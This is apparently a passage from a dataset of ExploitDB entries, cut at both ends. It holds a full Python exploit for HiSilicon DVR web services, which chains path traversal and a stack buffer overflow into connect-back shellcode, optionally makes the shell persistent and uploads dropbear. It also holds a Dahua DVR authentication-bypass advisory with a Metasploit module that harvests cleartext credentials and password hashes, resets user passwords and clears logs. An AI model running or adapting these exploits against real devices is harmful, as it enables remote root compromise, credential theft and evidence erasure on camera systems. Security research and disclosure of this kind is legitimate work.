'2008-01-13T00:00:00+00:00', 'cve': [], 'type': 'remote', 'port': 0}
{'code': '#!/usr/bin/env python2\r\n#\r\n# pwn hisilicon dvr web service\r\n#\r\n\r\nfrom pwn import *\r\nfrom time import sleep\r\nimport re\r\nimport argparse\r\nimport os\r\n\r\nparser = argparse.ArgumentParser(description=\'exploit HiSilicon DVR devices\')\r\nparser.add_argument(\'--rhost\', help=\'target host\', required=True)\r\nparser.add_argument(\'--rport\', help=\'target port\', default=80)\r\nparser.add_argument(\'--lhost\', help=\'connectback ip\', required=True)\r\nparser.add_argument(\'--lport\', help=\'connectback port\', default=31337)\r\nparser.add_argument(\'--bhost\', help=\'listen ip to bind (default: connectback)\')\r\nparser.add_argument(\'--bport\', help=\'listen port to bind (default: connectback)\')\r\nparser.add_argument(\'-n\', \'--nolisten\', help=\'do not start listener (you should care about connectback listener on your own)\', action=\'store_true\')\r\nparser.add_argument(\'-i\', \'--interactive\', help=\'select stack memory region interactively (rather than using autodetection)\', action=\'store_true\')\r\nparser.add_argument(\'-p\', \'--persistent\', help=\'make connectback shell persistent by restarting dvr app automatically (DANGEROUS!)\', action=\'store_true\')\r\nparser.add_argument(\'-u\', \'--upload\', help=\'upload tools (now hardcoded "./tools/dropbear" in script) after pwn\', action=\'store_true\')\r\nparser.add_argument(\'--offset\', help=\'exploit param stack offset to mem page base (default: 0x7fd3d8)\', default=0x7fd3d8)\r\nparser.add_argument(\'--cmdline\', help=\'cmdline of Sofia binary on remote target (default "/var/Sofia")\', default=\'/var/Sofia\')\r\n\r\nargs = parser.parse_args()\r\n\r\ntarget_host = args.rhost\r\ntarget_port = int(args.rport)\r\n\r\nsofia_cmdline = args.cmdline\r\n\r\nif args.interactive:\r\n    getleak_interactive = True\r\nelse:\r\n    getleak_interactive = False\r\n\r\nif args.persistent:\r\n    shell_persistent = True\r\nelse:\r\n    shell_persistent = False\r\n\r\nif args.upload:\r\n    shell_upload = True\r\nelse:\r\n    shell_upload = False\r\n    \r\nconnectback_host = args.lhost\r\nconnectback_port = int(args.lport)\r\n\r\nif args.bhost:\r\n    listen_host = args.bhost\r\nelse:\r\n    listen_host = connectback_host\r\nif args.bport:\r\n    listen_port = int(args.bport)\r\nelse:\r\n    listen_port = connectback_port\r\n\r\n\r\n"""\r\nvuln1: bof in httpd\r\n-------------------\r\nbuffer overflow in builtin webserver binary `Sofia`\r\nwhich can be exploited to run shellcode (as root) on the device.\r\n\r\nPoC payload to cause a segfault:\r\npayload = "GET " + "a"*299 + "xxxx" + " HTTP"\r\n\r\nnote, that in "xxxx" we can control pc register (program flow)!\r\n\r\nthere is no nx enabled, so executing shellcode in place of "a"*299\r\nis possible. however, stack address leak is needed to defeat aslr.\r\n\r\nvuln2: path traversal vuln in httpd\r\n-----------------------------------\r\nbuiltin webserver has a directory path traversal vulnerability\r\nwhich can be exploited to leak arbitrary files.\r\nnote, that the webserver binary `Sofia` is running as root,\r\nso exploiting this arbitrary file can be read from device fs.\r\n\r\nPoC request "GET ../../etc/passwd HTTP" reads file "/etc/passwd".\r\nFurthermore, dir listing is enabled as well.\r\n\r\nby exploiting vuln2 we can defeat aslr needed to exploit vuln1.\r\nnamely, filesystem at /proc contains lots of information\r\nabout running processes, e.g. contains memory mappings:\r\nrequest "GET ../../proc/[pid]/maps HTTP" reads memory\r\nmapping of process with pid [pid]. obverving the memory\r\nmapping patterns usually enough to defeat aslr (offset\r\nfrom mem map base is the same, even in different versions).\r\n"""\r\n\r\n# get pid of running dvr binary \'/var/Sofia\'\r\ndef findpid():\r\n    with log.progress(\'getting pidlist\') as logp:\r\n        c = context.log_level\r\n        context.log_level = \'error\'\r\n        r = remote(target_host, target_port)\r\n        r.sendline(\'GET ../../proc HTTP\')\r\n        pids = []\r\n        for line in r.recvall().splitlines():\r\n            res = re.match(r\'.*\\.\\./\\.\\./proc/([0-9]+)"\', line)\r\n            if res:\r\n                pids.append(int(res.group(1)))\r\n        r.close()\r\n        context.log_level = c\r\n        logp.success(\'found %d processes\' % len(pids))\r\n\r\n    with log.progress("searching for PID of \'%s\'" % sofia_cmdline) as logp:\r\n        pid_sofia = None\r\n        pids.sort(reverse=True)\r\n        for pid in pids:\r\n            logp.status(str(pid))\r\n            c = context.log_level\r\n            context.log_level = \'error\'\r\n            r = remote(target_host, target_port)\r\n            r.sendline(\'GET ../../proc/%d/cmdline HTTP\' % pid)\r\n            resp = r.recvall().splitlines()\r\n            r.close()\r\n            context.log_level = c\r\n            if sofia_cmdline + \'\\x00\' == resp[-1]:\r\n                pid_sofia = pid\r\n                logp.success(str(pid_sofia))\r\n                break\r\n        if not pid_sofia:\r\n            logp.failure(\'did not found\')\r\n\r\n    return pid_sofia\r\n\r\ndef getmodelnumber():\r\n    c = context.log_level\r\n    context.log_level = \'error\'\r\n    r = remote(target_host, target_port)\r\n    r.sendline(\'GET ../../mnt/custom/ProductDefinition HTTP\')\r\n    for l in r.recvall(timeout=5).decode(\'ascii\').replace(\',\', \'\\n\').splitlines():\r\n        if "Hardware" in l:\r\n            modelnumber = l.split(":")[1].split(\'"\')[1]\r\n    r.close()\r\n    context.log_level = c\r\n    return modelnumber\r\n\r\ndef guessregion(smaps):\r\n    for t in range(len(smaps)-7, 1, -1):\r\n        if (smaps[t][1][0], smaps[t+1][1][0], smaps[t+2][1][0], smaps[t+3][1][0], smaps[t+4][1][0], smaps[t+5][1][0], smaps[t+6][1][0]) == (8188, 8188, 8188, 8188, 8188, 8188, 8188) and smaps[t][1][1] == 4 and smaps[t+1][1][1] == 4 and smaps[t+2][1][1] == 4 and smaps[t+3][1][1] >= 8 and smaps[t+4][1][1] >= 4 and smaps[t+5][1][1] >= 4 and smaps[t+6][1][1] >= 8:\r\n            return (t+3)\r\n    return (-1)\r\n\r\n# getting stack section base address\r\n# \'k\' defines the section which contains the stack\r\ndef getleak(pid, interactive):\r\n    with log.progress("getting stack section base") as logp:\r\n        c = context.log_level\r\n        context.log_level = \'error\'\r\n        r = remote(target_host, target_port)\r\n        r.sendline(\'GET ../../proc/%d/smaps HTTP\' % pid)\r\n        smaps = []\r\n        memStart = False\r\n        for line in r.recvall().splitlines():\r\n            if memStart:\r\n                t += (int(line.split()[1]),)\r\n                i += 1\r\n                #if i >= 14:\r\n                if i >= 7:\r\n                    smaps.append((memStart, t))\r\n                    memStart = False\r\n            if \'rwxp\' in line:\r\n                memStart = int(line.split(\'-\')[0], 16)\r\n                i = 0\r\n                t = ()\r\n        guess = guessregion(smaps)\r\n        if guess < 0 or interactive:\r\n            j = 0\r\n            for i in smaps:\r\n                print (j, hex(i[0]), i[1:])\r\n                j += 1\r\n            k = int(raw_input(\'enter stack region id (guessed value = %d): \' % guess))\r\n        else:\r\n            k = guess\r\n        leak = smaps[k][0]\r\n        r.close()\r\n        context.log_level = c\r\n        logp.success(hex(leak))\r\n    return leak\r\n\r\n# connectback shellcode\r\n# badchars: 0x00, 0x0d, 0x20, 0x3f, 0x26\r\ndef shellcode(lhost, lport):\r\n    badchars = [0x00, 0x0d, 0x20, 0x3f, 0x26]\r\n    badchars = map(chr, badchars)\r\n\r\n    xscode  = "01108fe211ff"\r\n    xscode += "2fe111a18a78013a8a700221081c0121921a0f02193701df061c0ba10223"\r\n    xscode += "0b801022023701df3e270137c821301c01df0139fbd507a0921ac27105b4"\r\n    xscode += "69460b2701df0121081c01dfc046ffff7a69c0a858642f62696e2f736858"\r\n    xscode += "ffffc046efbeadde"\r\n    \r\n    h = lambda x: hex(int(x))[2:]\r\n    h2 = lambda x: h(x).zfill(2)\r\n    xscode = xscode[:164] + h(lport+0x100).zfill(4) + \'\'.join(map(h2, lhost.split(\'.\'))) + xscode[176:]\r\n    xscode = xscode.decode(\'hex\')\r\n    for badchar in badchars:\r\n        if badchar in xscode:\r\n            raise NameError(\'badchar %s in shellcode!\' % hex(ord(badchar)))\r\n    return xscode\r\n\r\ndef restart_dvrapp(c):\r\n    with log.progress(\'restarting dvr application\') as logp:\r\n        logp.status(\'looking up dvrhelper process\')\r\n        c.sendline(\'ps\')\r\n        cmdline = \'\'\r\n        while not \'dvrHelper\' in cmdline:\r\n            cmdline = c.recvline()\r\n        cmdline = cmdline.split()\r\n        while not \'ps\' in c.recvline():\r\n            pass\r\n        sleep(1)\r\n        logp.status(\'killing dvrhelper\')\r\n        c.sendline(\'kill %s\' % cmdline[0])\r\n        sleep(1)\r\n        cmdline_dvrhelper = \' \'.join(cmdline[4:])\r\n        logp.status(\'starting dvrhelper: %s\' % cmdline_dvrhelper)\r\n        c.sendline(cmdline_dvrhelper + \' 2>/dev/null &\')\r\n        sleep(1)\r\n        c.recvuntil(sofia_cmdline)\r\n        c.recvline()\r\n\r\ndef upload_tools(c):\r\n    with log.progress(\'uploading tools to /var/.tools\') as logp:\r\n        logp.status(\'creating dir\')\r\n        c.sendline(\'rm -fr /var/.tools\')\r\n        sleep(1)\r\n        c.sendline(\'mkdir /var/.tools\')\r\n        sleep(1)\r\n        tools = [\'dropbear\']\r\n        upload_blocksize = 1024\r\n        for tool in tools:\r\n            toolsize = os.path.getsize(\'./tools/%s\' % tool)\r\n            b = 0\r\n            fp = open("./tools/%s" % tool, "rb")\r\n            for chunk in iter(lambda: fp.read(upload_blocksize), \'\'):\r\n                chunkhex = \'\'.join([\'\\\\x\'+chunk.encode(\'hex\')[i:i+2].zfill(2) for i in range(0, len(chunk)*2, 2)])\r\n                c.sendline("echo -n -e \'%s\' >> /var/.tools/%s" % (chunkhex, tool))\r\n                b += len(chunk)\r\n                logp.status(\'%s: %d/%d\' % (tool, b, toolsize))\r\n                sleep(0.1)\r\n            fp.close()\r\n            c.sendline(\'chmod +x /var/.tools/%s\' % tool)\r\n            sleep(1)\r\n        logp.success(\' \'.join(tools))\r\n        \r\nlog.info(\'target is %s:%d\' % (target_host, target_port))\r\n\r\nif not args.nolisten:\r\n    log.info(\'connectback on %s:%d\' % (listen_host, listen_port))\r\n\r\nwith log.progress("assembling shellcode") as logp:\r\n    xscode = shellcode(connectback_host, connectback_port)\r\n    logp.success("done. length is %d bytes" % len(xscode))\r\n\r\nwith log.progress("identifying model number") as logp:\r\n    modelnumber = getmodelnumber()\r\n    logp.success(modelnumber)\r\n    \r\nlog.info(\'exploiting dir path traversal of web service to get leak addresses\')\r\nstack_section_base = getleak(findpid(), getleak_interactive)\r\nstack_offset = args.offset\r\nstack_20 = stack_section_base + stack_offset + 20\r\n\r\nlog.info(\'shellcode address is \' + hex(stack_20))\r\n\r\npayload  = "GET "\r\npayload += xscode\r\npayload += "a" * (299 - len(xscode))\r\npayload += p32(stack_20)\r\npayload += " HTTP"\r\n\r\nlog.info(\'exploiting buffer overflow in web service url path\')\r\nlog.info(\'remote shell should gained by connectback shellcode!\')\r\n\r\nif not args.nolisten:\r\n    l = listen(bindaddr=listen_host, port=listen_port, timeout=5)\r\n    c = l.wait_for_connection()\r\n\r\nr = remote(target_host, target_port)\r\nr.sendline(payload)\r\nr.recvall(timeout=5)\r\nr.close()\r\n\r\nif not args.nolisten:\r\n    if shell_persistent:\r\n        restart_dvrapp(c)\r\n\r\n    if shell_upload:\r\n        upload_tools(c)\r\n    \r\n    c.interactive()', 'description': 'HiSilicon DVR Devices - Remote Code Execution', 'author': 'Istvan Toth', '_id': 44004, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2017-09-07T00:00:00+00:00', 'cve': [], 'type': 'remote', 'port': 0}
{'code': 'Dahua DVR Authentication Bypass - CVE-2013-6117\r\n\r\n--Summary--\r\n\r\nDahua web-enabled DVRs and rebranded versions do not enforce authentication on their administrative services.\r\n\r\n# Zhejiang Dahua Technology Co., Ltd.\r\n# http://www.dahuasecurity.com\r\n\r\n--Affects--\r\n\r\n# Dahua web-enabled DVRs\r\n# Dahua-rebranded web-enabled DVRs\r\n# Verified on v2.608.0000.0 and 2.608.GV00.0\r\n\r\n--Details--\r\n\r\nDahua web-enabled DVRs utilize fat-client utilities like PSS, mobile client interfaces like iDMSS, and an ActiveX control, "webrec.cab" for browser-based access. These clients communicate with an administrative service which runs on TCP port 37777 by default and can be changed. At least in the case of the ActiveX control, a simple binary protocol is used. The various commands supported by the server are not authorized in any way. Authentication simply serves as a way to let the client transition past the login screen. Various commands can be replayed to any DVR sans authentication. These include:\r\n\r\n# Get the firmware version\r\n# Get the serial number\r\n# Get the email settings (includes username, SMTP server, and cleartext creds)\r\n# Get the DDNS settings (includes the DDNS service, server, and cleartext creds)\r\n# Get the NAS settings (again, cleartext creds)\r\n# Get the users (username, group membership, and hashed passwords)\r\n# Get the user groups (group name, description, etc)\r\n# Get the channels (camera channel names, e.g. "bedroom" "cocina")\r\n# Clear the logs (handy)\r\n# Change a user\'s password (unauthorized access)\r\n\r\nMore Details: http://blog.depthsecurity.com/2013/11/dahua-dvr-authentication-bypass-cve.html\r\n\r\n--MetaSploit Module--\r\n\r\nWe wrote a MetaSploit scanner module as a proof of concept. It is multithreaded and can look for a specified port, scan networks, find DVRs, get all the above info, change a user\'s password, and clear the logs when it\'s through. \r\n\r\n# GIT Repo: https://github.com/depthsecurity/dahua_dvr_auth_bypass.git\r\n\r\n--Other Concerns--\r\n\r\n# Some nearly simultaneous research independent of mine: http://www.kb.cert.org/vuls/id/800094 \r\n# CVE-2013-3612: DVRs listen for telnet by default and the root password is static and publicly known on all devices. (http://www.cctvforum.com/viewtopic.php?f=3&t=32408) \r\n# Other backdoor accounts exist, including one with a revolving password that is a simple date hash.\r\n# CVE-2013-3613: UPnP requests from untrusted addresses is supported and could be used to get publicly accessible telnet on a DVR.\r\n# CVE-2013-3614: Passwords are limited to 6 chars.\r\n# CVE-2013-3615: A weak 48-bit hash is utilized to protect DVR account passwords. \r\n# We admittedly did not perform any serious fuzzing of the vulnerable service so there is a large potential for more serious vulnerabilities that allow RCE. \r\n# Also, the DVRs listen on many different ports including telnet besides those necessary for web access (TCP/80,37777,&37778 by default). \r\n# SMTP, NAS, and DDNS credentials were all stored and transferred in cleartext. \r\n\r\n--Mitigation--\r\n\r\nThe best advice for now is to make sure these devices are not publicly accessible to the internet. Dahua initially stated they would work on fixing the issues but went radio silent afterwards.\r\n\r\n--Timeline--\r\n\r\n# 8/26/2013: Identified authorization flaw\r\n# 8/27/2013: Wrote proof of concept tool/scanner\r\n# 8/28/2013: Disclosed issue to Dahua\r\n# 8/30/2013: Received initial response from Dahua including request for more info\r\n# 8/30/2013: Responded to Dahua with requested info\r\n# 9/2/2013: Received confirmation that Dahua R&D is working to fix the issue\r\n# 10/2/2013: Requested status update from Dahua\r\n# 10/10/2013: Re-requested status update from Dahua after no response from 10/2/2013\r\n# 11/13/2013: Publicly disclosed vulnerability\r\n\r\nJake Reynolds - Partner / Principal Consultant   \r\n\r\nrequire \'msf/core\'\r\nclass Metasploit3 < Msf::Auxiliary\r\n        include Msf::Exploit::Remote::Tcp\r\n        include Msf::Auxiliary::Scanner\r\n\tinclude Msf::Auxiliary::Report\r\n\r\n        def initialize\r\n                super(\r\n                        \'Name\'           => \'Dahua DVR Auth Bypas Scanner\',\r\n                        \'Version\'        => \'$Revision: 1 $\',\r\n                        \'Description\'    => \'Scans for Dahua-based DVRs and then grabs settings. Optionally resets a user\\\'s password and clears the device logs\',\r\n                        \'Author\'         => \'Jake Reynolds - Depth Security\',\r\n                        \'License\'        => MSF_LICENSE\r\n                )\r\n\t\tderegister_options(\'RHOST\')\r\n                register_options(\r\n                        [\r\n \t\t\t\tOptString.new(\'USERNAME\', [true, \'A username to reset\', \'888888\']),\r\n \t\t\t\tOptString.new(\'PASSWORD\', [true, \'A password to reset the user with\', \'abc123\']),\r\n\t\t\t\tOptBool.new(\'RESET\', [true, \'Reset an existing user\\\'s pw?\', \'FALSE\']),\r\n\t\t\t\tOptBool.new(\'CLEAR_LOGS\', [true, \'Clear the DVR logs when we\\\'re done?\', \'TRUE\']),\r\n                                Opt::RPORT(37777)\r\n                        ], self.class)\r\n        end\r\n\r\n        def run_host(ip)\r\n\t\tusercount = 0\r\n\t\tu1 = "\\xa1\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t     "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"\r\n\t\tdvr_resp = "\\xb1\\x00\\x00\\x58\\x00\\x00\\x00\\x00"\r\n\t\tversion = "\\xa4\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t  "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"\r\n\t\temail = "\\xa3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x63\\x6f\\x6e\\x66\\x69\\x67\\x00\\x00" +\r\n\t\t\t "\\x0b\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"\r\n\t\tddns = "\\xa3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x63\\x6f\\x6e\\x66\\x69\\x67\\x00\\x00" +\r\n\t\t\t"\\x8c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"\r\n\t\tnas = "\\xa3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x63\\x6f\\x6e\\x66\\x69\\x67\\x00\\x00" +\r\n\t\t      "\\x25\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"\r\n\t\tchannels = "\\xa8\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t    "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t    "\\xa8\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t    "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"\r\n\t\tgroups = "\\xa6\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t  "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"\r\n\t\tusers = "\\xa6\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x09\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t  "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"\r\n\t\tsn = "\\xa4\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t      "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"\r\n\t\tclear_logs =  "\\x60\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x90\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t      "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"\r\n\t\tclear_logs2 = "\\x60\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x09\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t      "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"\r\n\t\tuser = "root"\r\n\t\tpass = " w"\r\n\t\tuser8pwhash = "4WzwxXxM" #888888\r\n\t\tuser6pwhash = "sh15yfFM" #666666\r\n\t\tuseradminpwhash = "6QNMIQGe" #admin\r\n                connect()\r\n\t\tsock.put(u1)\r\n\t\tdata = sock.recv(8)\t\r\n\t\tdisconnect()\r\n\t\tif data == dvr_resp\r\n\t\t\tprint_good("DVR FOUND: @ #{rhost}:#{rport}!")\r\n\t\t\treport_service(:host => rhost, :port => rport, :sname => \'dvr\', :info => "Dahua-based DVR")\r\n\t\t\tconnect()\r\n\t\t\tsock.put(version)\r\n\t\t\tdata = sock.get(1024)\r\n\t\t\tif data =~ /[\\x00]{8,}([[:print:]]+)/\r\n\t\t\t\tver = $1\r\n\t\t\t\tprint_status("Version: #{ver} @ #{rhost}:#{rport}!")\r\n\t\t\tend\r\n\r\n\t\t\tsock.put(sn)\r\n\t\t\tdata = sock.get(1024)\r\n\t\t\tif data =~ /[\\x00]{8,}([[:print:]]+)/\r\n\t\t\t\tserial = $1\r\n\t\t\t\tprint_status("Serial Number: #{serial} @ #{rhost}:#{rport}!")\r\n\t\t\tend\r\n\t\t\t\r\n\t\t\tsock.put(email)\r\n\t\t\tif data = sock.get(1024).split(\'&&\')\r\n\t\t\t\tprint_status("Email Settings: @ #{rhost}:#{rport}!")\r\n\t\t\t\tif data[0] =~ /([\\x00]{8,}(?=.{1,255}$)[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?(?:\\.[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?)*\\.?+:\\d+)/\r\n\t\t\t\t\tif mailhost = $1.split(\':\')\r\n\t\t\t\t\t\tprint_status("\tServer: #{mailhost[0]}")  if !mailhost[0].nil?\r\n\t\t\t\t\t\tprint_status("\tDestination Email: #{data[1]}")  if !mailhost[1].nil?\r\n\t\t\t\t\tend\r\n\t\t\t\t\tif !data[5].nil? and !data[6].nil?\r\n\t\t\t\t\t\tprint_good("\tSMTP User: #{data[5]}") if !data[5].nil?\r\n\t\t\t\t\t\tprint_good("\tSMTP Password: #{data[6]}") if !data[6].nil?\r\n\t\t\t\t\t\treport_auth_info(:host => mailhost[0], :port => mailhost[1], :user => data[5], \r\n\t\t\t\t\t\t                 :pass => data[6], :type => "Mail", :active => true) if ( !mailhost[0].nil? and \r\n\t\t\t\t\t\t\t\t !mailhost[1].nil? and !data[5].nil? and !data[6].nil? )\r\n\t\t\t\t\tend\r\n\t\t\t\tend\r\n\t\t\tend\r\n\t\t\t\r\n\t\t\tsock.put(ddns)\r\n\t\t\tif data = sock.get(1024)\r\n\t\t\t\tdata = data.split(/&&[0-1]&&/)\r\n\t\t\t\tdata.each_with_index {\r\n\t\t\t\t\t|val, index|\r\n\t\t\t\t\tif index > 0\r\n\t\t\t\t\t\tval = val.split("&&")\r\n\t\t\t\t\t\tprint_status("DDNS Settings @ #{rhost}:#{rport}!:")\r\n\t\t\t\t\t\tprint_status("\tDDNS Service: #{val[0]}") if !val.nil?\r\n\t\t\t\t\t\tprint_status("\tDDNS Server:  #{val[1]}") if !val.nil?\r\n\t\t\t\t\t\tprint_status("\tDDNS Port: #{val[2]}") if !val.nil?\r\n\t\t\t\t\t\tprint_status("\tDomain: #{val[3]}") if !val.nil?\r\n\t\t\t\t\t\tprint_good("\tUsername: #{val[4]}") if !val.nil?\r\n\t\t\t\t\t\tprint_good("\tPassword: #{val[5]}") if !val.nil?\r\n\t\t\t\t\t\treport_auth_info(:host => val[1], :port => val[2], :user => val[4], :pass => val[5], :type => "DDNS", \r\n\t\t\t\t\t\t\t\t:active => true) if ( !val[1].nil? and !val[2].nil? and !val[4].nil? and !val[5].nil? )\r\n\t\t\t\t\tend\r\n\t\t\t\t\r\n\t\t\t\t}\r\n\t\t\tend\r\n\t\t\t\r\n\t\t\tsock.put(nas)\r\n\t\t\tif data = sock.get(1024)\r\n\t\t\t\tprint_status("Nas Settings @ #{rhost}:#{rport}!:")\r\n\t\t\t\tserver = \'\'\r\n\t\t\t\tport = \'\'\r\n\t\t\t\tif data =~ /[\\x00]{8,}[\\x01][\\x00]{3,3}([\\x0-9a-f]{4,4})([\\x0-9a-f]{2,2})/\r\n\t\t\t\t  server =  $1.unpack(\'C*\').join(\'.\')\r\n\t\t\t\t  port = $2.unpack(\'S\')\r\n\t\t\t\t  print_status("\tNas Server #{server}")\r\n\t\t\t\t  print_status("\tNas Port: #{port}")\r\n\t\t\t\tend\r\n\t\t\t\tif data =~ /[\\x00]{16,}([[:print:]]+)[\\x00]{16,}([[:print:]]+)/\r\n\t\t\t\t\tftpuser = $1\r\n\t\t\t\t\tftppass = $2\r\n\t\t\t\t\tprint_good("\tFTP User: #{ftpuser}")\r\n\t\t\t\t\tprint_good("\tFTP Password: #{ftppass}")\r\n\t\t\t\t\t#report_auth_info(:host => server, :port => port, :user => ftpuser, :pass => ftppass, :type => "FTP", \r\n\t\t\t\t\t\t  #:active => true) if ( !server.nil? and !port.nil? and !ftpuser.nil? and !ftppass.nil? )\r\n\t\t\t\tend\r\n\t\t\tend\r\n\t\t\t\r\n\t\t\tsock.put(channels)\r\n\t\t\tdata = sock.get(1024).split(\'&&\')\r\n\t\t\tdisconnect()\r\n\t\t\tif (data.length > 1)\r\n\t\t\t\tprint_status("Camera Channels @ #{rhost}:#{rport}!:")\r\n\t\t\t\tdata.each_with_index { \r\n\t\t\t\t\t|val, index|\r\n\t\t\t\t\tprint_status("\t#{index+1}:#{val[/([[:print:]]+)/]}")\r\n\t\t\t\t}\r\n\t\t\tend\r\n\t\t\tconnect()\r\n\t\t\tsock.put(users)\r\n\t\t\tif data = sock.get(1024).split(\'&&\')\r\n\t\t\t\tprint_status("Users\\\\Hashed Passwords\\\\Rights\\\\Description: @ #{rhost}:#{rport}!")\r\n\t\t\t\tdata.each { \r\n\t\t\t\t\t|val| \r\n\t\t\t\t\tusercount += 1\r\n\t\t\t\t\tprint_status("\t#{val[/(([\\d]+)[:]([[:print:]]+))/]}")\r\n\t\t\t\t}\r\n\t\t\tend\r\n\t\t\tsock.put(groups)\r\n\t\t\tif data = sock.get(1024).split(\'&&\')\r\n\t\t\t\tprint_status("User Groups: @ #{rhost}:#{rport}!")\r\n\t\t\t\tdata.each { \r\n\t\t\t\t\t|val| \r\n\t\t\t\t\tprint_status("\t#{val[/(([\\d]+)[:]([\\w]+))/]}")\r\n\t\t\t\t}\r\n\t\t\tend\r\n\t\t\tif (datastore[\'RESET\'])\r\n\t\t\t\tuserstring = datastore[\'USERNAME\'] + ":Intel:" + datastore[\'PASSWORD\'] +\r\n\t\t\t\t\t":" +  datastore[\'PASSWORD\']\r\n\t\t\t\tu1 = "\\xa4\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1a\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t\t     "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"\r\n\t\t\t\tu2 = "\\xa4\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t\t     "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"\r\n\t\t\t\tu3 = "\\xa6\\x00\\x00\\x00#{userstring.length.chr}\\x00\\x00\\x00\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t\t     "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t\t     userstring\r\n\t\t\t\tsock.put(u1)\r\n\t\t\t\tdata = sock.get(1024)\r\n\t\t\t\tsock.put(u2)\r\n\t\t\t\tdata = sock.get(1024)\r\n\t\t\t\tsock.put(u3)\r\n\t\t\t\tdata = sock.get(1024)\r\n\t\t\t\tsock.put(u1)\r\n\t\t\t\tif data = sock.get(1024)\r\n\t\t\t\t\tprint_good("PASSWORD RESET!: user #{datastore[\'USERNAME\']}\'s password reset to #{datastore[\'PASSWORD\']}! @ #{rhost}:#{rport}!")\r\n\t\t\t\tend\r\n# \t\t\telsif (datastore[\'ACTION\'] == "DELETE")\r\n# \t\t\t\tu1 = "\\xa4\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n# \t\t\t\t     "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"\r\n# \t\t\t\tu2 = "\\xa4\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1a\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n# \t\t\t\t     "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"\r\n# \t\t\t\tdelete = "\\xa6\\x00\\x00\\x00#{datastore[\'USERNAME\'].length.chr}\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n# \t\t\t\t\t "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n# \t\t\t\t\t datastore[\'USERNAME\']\r\n# \t\t\t\tprint delete\r\n# \t\t\t\tsock.send(u1, 0)\r\n# \t\t\t\tsock.get_once\r\n# \t\t\t\tsock.send(delete, 0)\r\n# \t\t\t\tsock.get_once\r\n# \t\t\t\tsock.send(u2, 0)\r\n# \t\t\t\tsock.get_once\r\n# \t\t\t\t\t \r\n# \t\t\t\t\r\n# \t\t\telsif (datastore[\'ACTION\'] == "ADD")\r\n# \t\t\t\tuserstring = (usercount + 1).to_s + ":" + datastore[\'USERNAME\'] + 